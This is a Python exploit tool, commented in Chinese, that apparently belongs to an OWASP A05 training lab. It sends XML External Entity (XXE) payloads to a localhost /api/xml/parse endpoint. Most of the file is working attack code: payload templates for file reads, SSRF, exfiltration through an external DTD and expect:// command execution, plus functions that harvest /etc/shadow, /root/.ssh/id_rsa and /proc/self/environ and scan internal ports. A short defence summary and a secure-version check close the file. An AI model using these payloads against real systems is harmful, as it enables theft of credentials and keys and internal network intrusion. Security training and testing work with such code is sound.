#!/usr/bin/env python3
"""
A05:2021 - Security Misconfiguration
XXE (XML External Entity) 漏洞利用

此腳本展示 XXE 攻擊：
1. 本地檔案讀取 (file://)
2. SSRF 攻擊 (http://)
3. 系統資訊洩露
4. 目錄列表

CWE-611: Improper Restriction of XML External Entity Reference
"""

import requests
import argparse
import urllib.parse

# ANSI 顏色
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
RESET = '\033[0m'


def print_banner():
    print(f"""
{RED}╔══════════════════════════════════════════════════════════════╗
║  A05 - XXE (XML External Entity) Exploitation Tool           ║
║  XML 外部實體注入攻擊                                          ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")


# XXE Payload 模板
XXE_FILE_READ = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file://{filepath}">
]>
<root>
  <data>&xxe;</data>
</root>"""

XXE_SSRF = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "{url}">
]>
<root>
  <data>&xxe;</data>
</root>"""

XXE_PARAMETER_ENTITY = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file://{filepath}">
  <!ENTITY % dtd SYSTEM "{dtd_url}">
  %dtd;
]>
<root>
  <data>&send;</data>
</root>"""

XXE_EXPECT = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "expect://{command}">
]>
<root>
  <data>&xxe;</data>
</root>"""


def read_local_file(base_url, session, filepath):
    """利用 XXE 讀取本地檔案"""
    print(f"\n{BLUE}[*] 嘗試讀取檔案: {filepath}{RESET}")
    
    payload = XXE_FILE_READ.format(filepath=filepath)
    
    url = f"{base_url}/api/xml/parse"
    headers = {"Content-Type": "application/xml"}
    
    try:
        response = session.post(url, data=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f"  {GREEN}[+] 成功讀取檔案！{RESET}")
            print(f"\n{YELLOW}檔案內容:{RESET}")
            print("-" * 50)
            
            # 嘗試解析 JSON 回應
            try:
                data = response.json()
                content = data.get("data", response.text)
                print(content)
            except:
                print(response.text)
            
            print("-" * 50)
            return True
        else:
            print(f"  {RED}[-] 請求失敗 (狀態碼: {response.status_code}){RESET}")
            print(f"  {YELLOW}回應: {response.text[:200]}{RESET}")
            return False
            
    except Exception as e:
        print(f"  {RED}[-] 發生錯誤: {e}{RESET}")
        return False


def perform_ssrf(base_url, session, target_url):
    """利用 XXE 進行 SSRF 攻擊"""
    print(f"\n{BLUE}[*] 嘗試 SSRF 攻擊: {target_url}{RESET}")
    
    payload = XXE_SSRF.format(url=target_url)
    
    url = f"{base_url}/api/xml/parse"
    headers = {"Content-Type": "application/xml"}
    
    try:
        response = session.post(url, data=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f"  {GREEN}[+] SSRF 請求成功！{RESET}")
            print(f"\n{YELLOW}回應內容:{RESET}")
            print("-" * 50)
            
            try:
                data = response.json()
                content = data.get("data", response.text)
                # 限制輸出長度
                if len(content) > 1000:
                    print(content[:1000])
                    print(f"\n... (截斷，共 {len(content)} 字元)")
                else:
                    print(content)
            except:
                print(response.text[:1000])
            
            print("-" * 50)
            return True
        else:
            print(f"  {RED}[-] 請求失敗{RESET}")
            return False
            
    except Exception as e:
        print(f"  {RED}[-] 發生錯誤: {e}{RESET}")
        return False


def enumerate_common_files(base_url, session):
    """嘗試讀取常見的敏感檔案"""
    print(f"\n{BLUE}[*] 枚舉常見敏感檔案...{RESET}")
    
    common_files = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/hostname",
        "/proc/version",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/root/.bash_history",
        "/root/.ssh/id_rsa",
        "/var/log/auth.log",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Windows\\win.ini",
    ]
    
    readable_files = []
    
    for filepath in common_files:
        payload = XXE_FILE_READ.format(filepath=filepath)
        url = f"{base_url}/api/xml/parse"
        headers = {"Content-Type": "application/xml"}
        
        try:
            response = session.post(url, data=payload, headers=headers, timeout=5)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    content = data.get("data", "")
                    if content and "xxe" not in content.lower() and len(content) > 5:
                        print(f"  {GREEN}[+] {filepath} - 可讀取{RESET}")
                        readable_files.append(filepath)
                except:
                    pass
        except:
            pass
    
    return readable_files


def internal_port_scan(base_url, session, target_host="127.0.0.1", ports=None):
    """利用 XXE 進行內部端口掃描"""
    print(f"\n{BLUE}[*] 掃描內部端口: {target_host}{RESET}")
    
    if ports is None:
        ports = [21, 22, 23, 25, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200]
    
    open_ports = []
    
    for port in ports:
        target_url = f"http://{target_host}:{port}/"
        payload = XXE_SSRF.format(url=target_url)
        url = f"{base_url}/api/xml/parse"
        headers = {"Content-Type": "application/xml"}
        
        try:
            response = session.post(url, data=payload, headers=headers, timeout=3)
            
            # 如果能收到回應（即使是錯誤），端口可能是開放的
            if response.status_code == 200:
                try:
                    data = response.json()
                    content = data.get("data", "")
                    if content and len(content) > 0:
                        print(f"  {GREEN}[+] {target_host}:{port} - 開放{RESET}")
                        open_ports.append(port)
                except:
                    pass
        except requests.exceptions.Timeout:
            # 超時可能表示端口被過濾或無回應
            pass
        except:
            pass
    
    return open_ports


def test_secure_version(base_url, session):
    """測試安全版本"""
    print(f"\n{BLUE}[*] 測試安全版本的 XXE 防禦...{RESET}")
    
    # 嘗試最基本的 XXE 攻擊
    payload = XXE_FILE_READ.format(filepath="/etc/passwd")
    url = f"{base_url}/api/xml/parse"
    headers = {"Content-Type": "application/xml"}
    
    try:
        response = session.post(url, data=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            content = data.get("data", "")
            
            # 檢查是否成功讀取檔案
            if "root:" in content:
                print(f"  {RED}[!] 警告：XXE 攻擊仍然有效！{RESET}")
                return False
            else:
                print(f"  {GREEN}[+] XXE 攻擊被阻止{RESET}")
                return True
        elif response.status_code == 400:
            print(f"  {GREEN}[+] 安全版本正確拒絕了 DOCTYPE 宣告{RESET}")
            try:
                data = response.json()
                print(f"      回應: {data.get('error', 'N/A')}")
            except:
                pass
            return True
        else:
            print(f"  {YELLOW}[?] 收到未預期的狀態碼: {response.status_code}{RESET}")
            return True
            
    except Exception as e:
        print(f"  {YELLOW}[?] 請求失敗（可能是正常的防禦行為）: {e}{RESET}")
        return True


def main():
    parser = argparse.ArgumentParser(
        description="A05 - XXE (XML External Entity) 漏洞利用",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
範例:
  %(prog)s                                    # 基本攻擊展示
  %(prog)s --file /etc/passwd                 # 讀取指定檔案
  %(prog)s --ssrf http://localhost:8080/      # SSRF 攻擊
  %(prog)s --enumerate                        # 枚舉常見檔案
  %(prog)s --port-scan                        # 內部端口掃描
  %(prog)s --compare                          # 比較安全版本
        """
    )
    parser.add_argument("--vulnerable-url", default="http://localhost:8081",
                        help="漏洞版本 URL")
    parser.add_argument("--secure-url", default="http://localhost:8082",
                        help="安全版本 URL")
    parser.add_argument("--file", help="要讀取的檔案路徑")
    parser.add_argument("--ssrf", help="SSRF 目標 URL")
    parser.add_argument("--enumerate", action="store_true",
                        help="枚舉常見敏感檔案")
    parser.add_argument("--port-scan", action="store_true",
                        help="內部端口掃描")
    parser.add_argument("--compare", action="store_true",
                        help="比較安全版本與漏洞版本")
    
    args = parser.parse_args()
    
    print_banner()
    
    session = requests.Session()
    
    print(f"{YELLOW}[*] 目標: {args.vulnerable_url}{RESET}")
    
    # 根據參數執行不同攻擊
    if args.file:
        read_local_file(args.vulnerable_url, session, args.file)
    elif args.ssrf:
        perform_ssrf(args.vulnerable_url, session, args.ssrf)
    elif args.enumerate:
        readable = enumerate_common_files(args.vulnerable_url, session)
        print(f"\n{YELLOW}[*] 總共發現 {len(readable)} 個可讀取的檔案{RESET}")
    elif args.port_scan:
        open_ports = internal_port_scan(args.vulnerable_url, session)
        print(f"\n{YELLOW}[*] 總共發現 {len(open_ports)} 個開放的端口{RESET}")
    else:
        # 預設展示
        print(f"\n{BLUE}[*] 執行基本 XXE 攻擊展示...{RESET}")
        
        # 1. 讀取 /etc/passwd
        read_local_file(args.vulnerable_url, session, "/etc/passwd")
        
        # 2. 讀取 /etc/hosts
        read_local_file(args.vulnerable_url, session, "/etc/hosts")
        
        # 3. SSRF 到內部服務
        perform_ssrf(args.vulnerable_url, session, "http://localhost:8081/actuator/health")
    
    # 比較模式
    if args.compare:
        print(f"\n{BLUE}{'='*60}{RESET}")
        print(f"{BLUE}[*] 比較安全版本: {args.secure_url}{RESET}")
        test_secure_version(args.secure_url, session)
    
    # 總結
    print(f"\n{BLUE}{'='*60}{RESET}")
    print(f"{YELLOW}[*] XXE 攻擊技術總結:{RESET}")
    print("    1. 本地檔案讀取 (file://)")
    print("    2. SSRF 攻擊 (http://)")
    print("    3. 盲目 XXE (使用外部 DTD)")
    print("    4. 錯誤訊息洩露")
    
    print(f"\n{YELLOW}[*] 防禦建議:{RESET}")
    print("    1. 禁用 DTD (DOCTYPE)")
    print("    2. 禁用外部實體")
    print("    3. 禁用參數實體")
    print("    4. 使用 XML 白名單驗證")
    print("    5. 升級到安全的 XML 解析器")


if __name__ == "__main__":
    main()
